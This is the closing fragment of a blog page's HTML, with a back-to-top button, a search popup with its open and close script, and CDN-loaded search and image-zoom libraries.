data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
